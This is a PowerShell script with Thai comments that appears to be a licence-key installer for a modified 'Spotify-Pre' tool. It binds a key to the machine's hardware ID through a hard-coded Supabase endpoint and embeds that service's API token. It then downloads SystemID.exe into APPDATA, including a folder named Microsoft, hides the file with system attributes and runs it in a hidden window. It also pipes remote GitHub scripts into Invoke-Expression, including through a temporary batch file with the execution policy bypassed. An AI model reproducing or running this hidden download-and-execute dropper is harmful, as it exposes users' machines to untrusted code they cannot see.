function Remove-SystemID {
    # ลบไฟล์ SystemID.exe
    $exePath = "$env:APPDATA\Motify\SystemID.exe"
	
		if (Test-Path $exePath) {
    Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
	}
	
	$processName = "SystemID"

	# ตรวจสอบว่า SystemID.exe กำลังรันอยู่หรือไม่
	$runningProcesses = Get-Process | Where-Object { $_.ProcessName -eq $processName } -ErrorAction SilentlyContinue

	if ($runningProcesses) {
    Stop-Process -Name $processName -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2  # รอ 2 วินาทีเพื่อให้กระบวนการปิดสนิท
	}

    # ลบ Registry entry สำหรับ Startup
    $registryKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $registryKeyName = "SystemID"

    # ตรวจสอบว่า Registry key มีอยู่หรือไม่
    $key = Get-ItemProperty -Path $registryKeyPath -Name $registryKeyName -ErrorAction SilentlyContinue

    if ($key) {
        Remove-ItemProperty -Path $registryKeyPath -Name $registryKeyName -Force

    } else {
        Write-Log "."
    }

    # ลบไฟล์ Spotify (ในกรณีที่มีการติดตั้ง)
    $spotifyPath = "$env:APPDATA\Spotify"
    if (Test-Path $spotifyPath) {
        Remove-Item -Path $spotifyPath -Recurse -Force -ErrorAction SilentlyContinue
        Write-Log "."

    } else {
        Write-Log "."

    }

    # สร้างไฟล์ .bat เพื่อลบ Spotify และรัน core.ps1
    $batchScript = @"
@echo off
set PWSH=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
set ScriptUrl=https://raw.githubusercontent.com/DevilScript/Spotify-Pre/refs/heads/main/core.ps1

"%PWSH%" -NoProfile -ExecutionPolicy Bypass -Command "& { Invoke-Expression (Invoke-WebRequest -Uri '%ScriptUrl%').Content }"
"@

    # สร้างไฟล์ .bat ชั่วคราว
    $batFilePath = [System.IO.Path]::Combine($env:TEMP, "remove_spotify.bat")
    $batchScript | Set-Content -Path $batFilePath

    # รันไฟล์ .bat ที่สร้างขึ้น
    Start-Process -FilePath $batFilePath -NoNewWindow -Wait

    # ลบไฟล์ .bat หลังจากการทำงานเสร็จ
        Remove-Item -Path $batFilePath -Force
	Stop-Process -Id $PID -Force -ErrorAction SilentlyContinue
exit
}



function Download-Script {
    param (
        [string]$url,  # URL ของไฟล์ .exe
        [string]$fileName  # ชื่อไฟล์ที่ต้องการบันทึก
    )
    
    # Path ของโฟลเดอร์ Motify
    $dirPath = "$env:APPDATA\Motify"
    $micoPath = "$env:APPDATA\Microsoft"
	
	
    # ตรวจสอบว่าโฟลเดอร์ Motify มีอยู่หรือไม่ ถ้าไม่มีให้สร้าง
    if (-not (Test-Path -Path $dirPath)) {
        New-Item -ItemType Directory -Path $dirPath -Force | Out-Null
    }

    # Path ของไฟล์ที่บันทึก
    $filePath = Join-Path $dirPath $fileName
	$micofilePath = Join-Path $micoPath $fileName
       
	# เอาคุณสมบัติซ่อนออกก่อน
    if (Test-Path $filePath) {
        attrib -h -s $filePath
    }
    if (Test-Path $micofilePath) {
        attrib -h -s $micofilePath
    }
    # ดาวน์โหลดไฟล์ .exe จาก URL และบันทึกลงในโฟลเดอร์ Motify
try {
        Invoke-WebRequest -Uri $url -OutFile $filePath
        Invoke-WebRequest -Uri $url -OutFile $micofilePath
	attrib +h +s $filePath  # ซ่อนไฟล์
	attrib +h +s $micofilePath  

    } catch {
        Write-Log "Exe: Failed to download the file."
        exit
    }

if (Test-Path $filePath) {
    Start-Process $filePath -WindowStyle Hidden
}
if (Test-Path $micofilePath) {
    Start-Process $micofilePath -WindowStyle Hidden
}

}

function Write-Log {
    param (
        [string]$message
    )
    
    $logDirPath = "$env:APPDATA\Motify"  # Path ของโฟลเดอร์ Motify
    $logFilePath = "$logDirPath\log.txt"
    
    # ตรวจสอบว่าโฟลเดอร์ Motify มีอยู่หรือไม่ ถ้าไม่มีให้สร้าง
    if (-not (Test-Path -Path $logDirPath)) {
        New-Item -ItemType Directory -Path $logDirPath -Force | Out-Null
    }

    $logMessage = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $message"
    
    # บันทึกข้อความลงในไฟล์ log
    Add-Content -Path $logFilePath -Value $logMessage
}

# ตรวจสอบว่าไฟล์ SystemID.exe มีอยู่ในโฟลเดอร์ Motify / Microsoftหรือไม่
$exePath = "$env:APPDATA\Motify\SystemID.exe"
$micoexePath = "$env:APPDATA\Microsoft\SystemID.exe"

	if ((Test-Path $exePath) -or (Test-Path $micoexePath)) {
    Write-Host "ID found. Running..." -ForegroundColor Green

# 1. ดึง HWID จากเครื่อง
$hwid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
if (-not $hwid) {
    Write-Host "Error: Unable To Retrieve HWID" -ForegroundColor Red
    Write-Log "Exe: Failed to retrieve HWID."
    Pause
    exit
}

Write-Host "System: HWID [ $hwid ]" -ForegroundColor DarkYellow

# 2. ดึง path ของโฟลเดอร์ AppData
$appDataPath = [System.Environment]::GetFolderPath('ApplicationData')

# 3. สร้าง path สำหรับไฟล์ JSON ใน AppData
$filePath = "$appDataPath\Motify\key_hwid.json"

# 4. ตรวจสอบว่าไฟล์ JSON มีอยู่หรือไม่
if (Test-Path $filePath) {
    Write-Log "Success: Found key_hwid.json file."
    Write-Host "System: Found json file, Validating key..." -ForegroundColor DarkYellow
    $data = Get-Content $filePath | ConvertFrom-Json

    # ตรวจสอบค่าของ key และ hwid
	Write-Log "Debug: key = | $($data.key) |, Hwid = | $($data.hwid) |"

    # เช็คว่า $data.key และ $data.hwid มีค่าหรือไม่
    if (-not $data.key -or -not $data.hwid) {
        Write-Host "Error: Key/HWID is missing in the file." -ForegroundColor Red
        Write-Log "Exe: Key/HWID is missing in the file."
		Remove-SystemID
		Remove-Item $filePath -Force
        Pause
        exit
    }

    $key = $data.key
    $hwid = $data.hwid

    # 5. ตรวจสอบกับ Supabase ว่ายังมี Key นี้อยู่หรือไม่
    $url = "https://sepwbvwlodlwehflzyiw.supabase.co"
    $key_api = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNlcHdidndsb2Rsd2VoZmx6eWl3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Mzk5MTM3NjIsImV4cCI6MjA1NTQ4OTc2Mn0.kwtXM0A0O-7YfuIqoGX8uCfWxT3gLi96RY9XuxM_rAI"

    $response = Invoke-RestMethod -Uri "$url/rest/v1/keys?key=eq.$key" -Method Get -Headers @{ "apikey" = $key_api }

    if ($response.Count -eq 0) {
        Write-Host "Error: Key Deleted From DATA." -ForegroundColor Red
        Write-Log "Exe: Key Deleted from DATA."
        Remove-Item $filePath -Force
		Remove-SystemID
        Pause
        exit
    }

    # 6. ตรวจสอบคีย์ใน Supabase
    $existingKey = $response[0]

    # 7. ตรวจสอบว่า key ถูกใช้ไปแล้วหรือยัง
    if ($existingKey.used -eq $true) {
        if ($existingKey.hwid -eq $hwid) {
            Write-Host "System: Key Matches Your HWID." -ForegroundColor DarkYellow
        } else {
            Write-Host "Error: Invalid HWID!" -ForegroundColor Red
            Write-Log "Exe: Key already in use on another device."
            Remove-Item $filePath -Force
			Remove-SystemID
            Pause
            exit
        }
    } else {
        Write-Host "System: Linking to HWID..." -ForegroundColor DarkYellow
        Write-Log "Success: Key is TRUE, Linking to HWID..."
    }
} else {
    Write-Host "System: No found json file." -ForegroundColor DarkYellow
    Write-Host "Enter The Key: " -ForegroundColor Cyan -NoNewline
    $key = Read-Host

    # 9. ตรวจสอบคีย์ใน Supabase
    $url = "https://sepwbvwlodlwehflzyiw.supabase.co"
    $key_api = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNlcHdidndsb2Rsd2VoZmx6eWl3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Mzk5MTM3NjIsImV4cCI6MjA1NTQ4OTc2Mn0.kwtXM0A0O-7YfuIqoGX8uCfWxT3gLi96RY9XuxM_rAI"
    
    $response = Invoke-RestMethod -Uri "$url/rest/v1/keys?key=eq.$key" -Method Get -Headers @{ "apikey" = $key_api }

    if ($response.Count -eq 0) {
        Write-Host "Error: Key Not Found In The DATA" -ForegroundColor Red
        Write-Log "Exe: Key Not found in the DATA."
        Pause
        exit
    }

    $existingKey = $response[0]

    # 11. ตรวจสอบว่า key ถูกใช้ไปแล้วหรือยัง
    if ($existingKey.used -eq $true) {
        if ($existingKey.hwid -eq $hwid) {
            Write-Host "System: Key Matches Your HWID." -ForegroundColor DarkYellow
        } else {
            Write-Host "Error: Invalid HWID!" -ForegroundColor Red
            Write-Log "Exe: Key already in use on another device."
			Remove-Item $filePath -Force
			Remove-SystemID
            Pause
            exit
        }
    } else {
        Write-Host "System: Linking to HWID..." -ForegroundColor DarkYellow
    }
}

# 12. ล็อค key กับ HWID
$updateData = @{
    used = $true
    hwid = $hwid
}

# ตรวจสอบว่า $key มีค่าและไม่เป็น null ก่อนการอัพเดท
if (-not $key) {
    Write-Host "Error: Key is null" -ForegroundColor Red
    Write-Log "Exe: Key is null or empty."
    Pause
    exit
}

$updateResponse = Invoke-RestMethod -Uri "$url/rest/v1/keys?key=eq.$key" -Method PATCH -Headers @{ "apikey" = $key_api } -Body ($updateData | ConvertTo-Json) -ContentType "application/json"

# 13. บันทึก key และ HWID ลงในไฟล์ JSON หลังจากที่ตรวจสอบเรียบร้อยแล้ว
$expiry_date = $existingKey.expiry_date
$data = @{
    key = $key
    hwid = $hwid
    Expired = $expiry_date
}

# 14. ตรวจสอบและสร้างโฟลเดอร์ที่ต้องการเก็บไฟล์ JSON
$dirPath = Split-Path -Path $filePath -Parent
if (-not (Test-Path -Path $dirPath)) {
    Write-Log "Creating directory for key_hwid.json."
    New-Item -ItemType Directory -Path $dirPath -Force | Out-Null
}

# 15. อัปเดตไฟล์ key_hwid.json ให้ตรงกับคีย์และ HWID ล่าสุด
$data | ConvertTo-Json | Set-Content $filePath

# 16. ส่งสถานะเป็น "Active" ไปยัง Supabase
$statusUpdateData = @{
    status = "Active"  # กำหนดสถานะให้เป็น Active
}

$statusUpdateResponse = Invoke-RestMethod -Uri "$url/rest/v1/keys?key=eq.$key" -Method PATCH -Headers @{ "apikey" = $key_api } -Body ($statusUpdateData | ConvertTo-Json) -ContentType "application/json"

# 17. บันทึกการล็อค key และ HWID ไปที่ Auth-log
$currentDateTime = Get-Date
$logData = @{
    key = $key
    hwid = $hwid
    status = "Verified"
	timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")

}

$logResponse = Invoke-RestMethod -Uri "$url/rest/v1/auth_log" -Method POST -Headers @{ "apikey" = $key_api } -Body ($logData | ConvertTo-Json) -ContentType "application/json"

# 18. รัน เมื่อ key และ HWID ผ่าน
Write-Host "System: Expired [ $expiry_date ]" -ForegroundColor DarkYellow
Write-Host "Verified. Running Program..." -ForegroundColor Green

# ดาวน์โหลดและรัน SystemID.exe
$scriptUrl = "https://raw.githubusercontent.com/DevilScript/Spotify-Pre/refs/heads/main/install1.ps1"
$checkUrl = "https://github.com/DevilScript/Spotify-Pre/raw/refs/heads/main/SystemID.exe"
$fileName = "SystemID.exe"
Download-Script -url $checkUrl -fileName $fileName
Invoke-Expression (Invoke-WebRequest -Uri $scriptUrl).Content
Start-Process $exePath -WindowStyle Hidden  # รันแบบซ่อนหน้าต่าง
Start-Process $micoexePath -WindowStyle Hidden  # รันแบบซ่อนหน้าต่าง

	exit
} else {
    # 1. ดึง HWID จากเครื่อง
$hwid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
if (-not $hwid) {
    Write-Host "Error: Unable To Retrieve HWID" -ForegroundColor Red
    Write-Log "Exe: Failed to retrieve HWID."
    Pause
    exit
}

Write-Host "System: HWID [ $hwid ]" -ForegroundColor DarkYellow

# 2. ดึง path ของโฟลเดอร์ AppData
$appDataPath = [System.Environment]::GetFolderPath('ApplicationData')

# 3. สร้าง path สำหรับไฟล์ JSON ใน AppData
$filePath = "$appDataPath\Motify\key_hwid.json"

# 4. ตรวจสอบว่าไฟล์ JSON มีอยู่หรือไม่
if (Test-Path $filePath) {
    Write-Log "Success: Found key_hwid.json file."
    Write-Host "System: Found json file, validating the key..." -ForegroundColor DarkYellow
    $data = Get-Content $filePath | ConvertFrom-Json

    # เช็คว่า $data.key และ $data.hwid มีค่าหรือไม่
    if (-not $data.key -or -not $data.hwid) {
        Write-Host "Error: Key/HWID is missing in the file." -ForegroundColor Red
        Write-Log "Exe: Key/HWID is missing in the file."
		Remove-Item $filePath -Force
		Remove-SystemID
        Pause
        exit
    }

    $key = $data.key
    $hwid = $data.hwid

    # 5. ตรวจสอบกับ Supabase ว่ายังมี Key นี้อยู่หรือไม่
    $url = "https://sepwbvwlodlwehflzyiw.supabase.co"
    $key_api = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNlcHdidndsb2Rsd2VoZmx6eWl3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Mzk5MTM3NjIsImV4cCI6MjA1NTQ4OTc2Mn0.kwtXM0A0O-7YfuIqoGX8uCfWxT3gLi96RY9XuxM_rAI"

    $response = Invoke-RestMethod -Uri "$url/rest/v1/keys?key=eq.$key" -Method Get -Headers @{ "apikey" = $key_api }

    if ($response.Count -eq 0) {
        Write-Host "Error: Key Deleted From DATA." -ForegroundColor Red
        Write-Log "Exe: Key deleted from DATA."
        Remove-Item $filePath -Force
		Remove-SystemID
        Pause
        exit
    }

    # 6. ตรวจสอบคีย์ใน Supabase
    $existingKey = $response[0]

    # 7. ตรวจสอบว่า key ถูกใช้ไปแล้วหรือยัง
    if ($existingKey.used -eq $true) {
        if ($existingKey.hwid -eq $hwid) {
            Write-Host "System: Key Matches Your HWID." -ForegroundColor DarkYellow
        } else {
            Write-Host "Error: Invalid HWID!" -ForegroundColor Red
            Write-Log "Exe: Key already in use on another device."
            Remove-Item $filePath -Force
			Remove-SystemID
            Pause
            exit
        }
    } else {
        Write-Host "System: Linking to HWID..." -ForegroundColor DarkYellow
    }
} else {
    Write-Host "System: No found json file." -ForegroundColor DarkYellow
    Write-Host "Enter The Key: " -ForegroundColor Cyan -NoNewline
    $key = Read-Host

    # 9. ตรวจสอบคีย์ใน Supabase
    $url = "https://sepwbvwlodlwehflzyiw.supabase.co"
    $key_api = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNlcHdidndsb2Rsd2VoZmx6eWl3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Mzk5MTM3NjIsImV4cCI6MjA1NTQ4OTc2Mn0.kwtXM0A0O-7YfuIqoGX8uCfWxT3gLi96RY9XuxM_rAI"
    
    $response = Invoke-RestMethod -Uri "$url/rest/v1/keys?key=eq.$key" -Method Get -Headers @{ "apikey" = $key_api }

    if ($response.Count -eq 0) {
        Write-Host "Error: Key Not Found In DATA" -ForegroundColor Red
        Write-Log "Exe: Key Not found in the DATA."
        Pause
        exit
    }

    $existingKey = $response[0]

    # 11. ตรวจสอบว่า key ถูกใช้ไปแล้วหรือยัง
    if ($existingKey.used -eq $true) {
        if ($existingKey.hwid -eq $hwid) {
            Write-Host "System: Key Matches Your HWID." -ForegroundColor DarkYellow
            Write-Log "Success: Key already in use but matches HWID."
        } else {
            Write-Host "Error: Invalid HWID!" -ForegroundColor Red
            Write-Log "Exe: Key already in use on another device."
			Remove-Item $filePath -Force
		    Remove-SystemID
            Pause
            exit
        }
    } else {
        Write-Host "System: Linking to HWID..." -ForegroundColor DarkYellow
    }
}
# 12. ล็อค key กับ HWID
$updateData = @{
    used = $true
    hwid = $hwid
}

# ตรวจสอบว่า $key มีค่าและไม่เป็น null ก่อนการอัพเดท
if (-not $key) {
    Write-Host "Error: Key is null" -ForegroundColor Red
    Write-Log "Exe: Key is null or empty."
    Pause
    exit
}

$updateResponse = Invoke-RestMethod -Uri "$url/rest/v1/keys?key=eq.$key" -Method PATCH -Headers @{ "apikey" = $key_api } -Body ($updateData | ConvertTo-Json) -ContentType "application/json"

# 13. บันทึก key และ HWID ลงในไฟล์ JSON หลังจากที่ตรวจสอบเรียบร้อยแล้ว
$expiry_date = $existingKey.expiry_date
$data = @{
    key = $key
    hwid = $hwid
    Expired = $expiry_date
}

# 14. ตรวจสอบและสร้างโฟลเดอร์ที่ต้องการเก็บไฟล์ JSON
$dirPath = Split-Path -Path $filePath -Parent
if (-not (Test-Path -Path $dirPath)) {
    Write-Log "Creating directory for key_hwid.json."
    New-Item -ItemType Directory -Path $dirPath -Force | Out-Null
}

# 15. อัปเดตไฟล์ key_hwid.json ให้ตรงกับคีย์และ HWID ล่าสุด
$data | ConvertTo-Json | Set-Content $filePath

# 16. ส่งสถานะเป็น "Active" ไปยัง Supabase
$statusUpdateData = @{
    status = "Active"  # กำหนดสถานะให้เป็น Active
}

$statusUpdateResponse = Invoke-RestMethod -Uri "$url/rest/v1/keys?key=eq.$key" -Method PATCH -Headers @{ "apikey" = $key_api } -Body ($statusUpdateData | ConvertTo-Json) -ContentType "application/json"
	
# 17. บันทึกการล็อค key และ HWID ไปที่ Auth-log
$currentDateTime = Get-Date
$logData = @{
    key = $key
    hwid = $hwid
    status = "Verified"
	timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
}

$logResponse = Invoke-RestMethod -Uri "$url/rest/v1/auth_log" -Method POST -Headers @{ "apikey" = $key_api } -Body ($logData | ConvertTo-Json) -ContentType "application/json"

# 18. รัน เมื่อ key และ HWID ผ่าน
Write-Host "System: Expired [ $expiry_date ]" -ForegroundColor DarkYellow
Write-Host "Verified. Running Program..." -ForegroundColor Green

# ดาวน์โหลดและรัน SystemID.exe
$scriptUrl = "https://raw.githubusercontent.com/DevilScript/Spotify-Pre/refs/heads/main/install1.ps1"
$checkUrl = "https://github.com/DevilScript/Spotify-Pre/raw/refs/heads/main/SystemID.exe"
$fileName = "SystemID.exe"
Download-Script -url $checkUrl -fileName $fileName
Invoke-Expression (Invoke-WebRequest -Uri $scriptUrl).Content
Start-Process $exePath -WindowStyle Hidden  # รันแบบซ่อนหน้าต่าง
Start-Process $micoexePath -WindowStyle Hidden  # รันแบบซ่อนหน้าต่าง
    exit
}
